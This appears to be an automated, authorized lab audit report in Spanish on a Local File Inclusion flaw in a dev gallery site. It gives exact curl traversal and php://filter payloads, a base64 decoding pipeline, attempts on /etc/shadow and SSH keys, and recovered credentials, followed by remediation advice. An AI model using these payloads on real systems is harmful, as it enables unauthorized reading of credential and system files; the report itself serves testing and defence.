# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T09:01:30 (UTC)
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Parámetro vulnerable identificado: gallery.php?page
- Vulnerabilidad: Local File Inclusion (LFI). Confirmado lectura de ficheros locales.
- Archivos sensibles leídos con éxito: /etc/passwd, config.php (archivo de configuración de la app). Se intentó /etc/shadow y claves SSH (no recuperadas), pero se extrajo config.php y credenciales.
- Impacto: divulgación de credenciales de base de datos y token API, posible escalada con estas credenciales.

Pruebas realizadas y comandos exactos (Kali-styled):
1) Reconocimiento inicial:
   curl -s -D root_headers.txt -o root_body.html http://web.dev.local:8081/
   Observación: enlaces a gallery.php?page=... en la página raíz.

2) Fuzzing / pruebas LFI básicas (ejemplos ejecutados):
   # Pruebas de traversal
   curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
   curl -s "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
   curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd%00"

   # Uso de wrapper php://filter para base64
   curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"

3) Resultados clave:
   - /etc/passwd leído con éxito via traversal (salida incluída dentro del HTML): se observó contenido como "root:x:0:0:root:/root:/bin/bash".
   - php://filter devolvió content base64 en la página; tras extraer y decodificar se recuperó un fichero de configuración PHP (config.php) que contiene credenciales.

4) Extracción de config.php (payload usado):
   curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php" -o response.html
   # Extraer bloque base64 y decodificar:
   grep -oE '([A-Za-z0-9+/]{40,}={0,2})' response.html | head -n1 | base64 -d > config.php

   Contenido recuperado (resumen):
   - DB_USER: gallery_user
   - DB_PASS: SuperSecret123!
   - DB_NAME: gallery_db
   - SECRET_KEY: th1s_is_a_v3ry_s3cr3t_k3y_2025
   - API_TOKEN: api_token_abc123xyz789

5) Intentos adicionales de extracción:
   - /etc/shadow (php://filter and raw) => no fue posible extraer contenido legible (respuesta vacía/indicó no encontrado o sin permisos).
   - /root/.ssh/id_rsa, /home/www-data/.ssh/id_rsa => no retornaron claves (respuesta vacía o sin contenido decodificable).

Impacto y recomendaciones:
- Impacto: alta. Se exponen credenciales confidenciales (DB, API token) que permiten acceso a la base de datos y potencial pivot/escala de privilegios. La lectura de /etc/passwd confirma la posibilidad de enumerar usuarios del sistema.

- Recomendaciones inmediatas:
  1. Desinfectar: corregir la inclusión insegura en gallery.php; validar/sanitizar el parámetro "page" contra una lista blanca de valores permitidos.
  2. Evitar incluir rutas directamente desde input; usar mapeo seguro (p.ej. switch) a ficheros permitidos.
  3. Deshabilitar wrappers peligrosos si no son necesarios y minimizar permisos del usuario webserver (www-data).
  4. Rotar credenciales comprometidas (DB password, API tokens) encontradas en config.php.
  5. Revisar logs para detectar accesos no autorizados adicionales y aplicar mitigaciones (WAF, reglas básicas de bloqueo).

Comandos y archivos generados durante la auditoría (en directorio lfi_scan_output):
- root_body.html, results.txt, gallery_results.txt, exploit_b64.txt, exploit_attempts.txt, decoded/decoded_1 (config recuperado)

Conclusión:
- Vulnerabilidad LFI confirmada y explotada para lectura de ficheros locales (se ha recuperado /etc/passwd y el archivo de configuración config.php con credenciales). Se recomienda acción inmediata según las recomendaciones.

-- Auditor: Laboratorio autorizado (script automatizado)
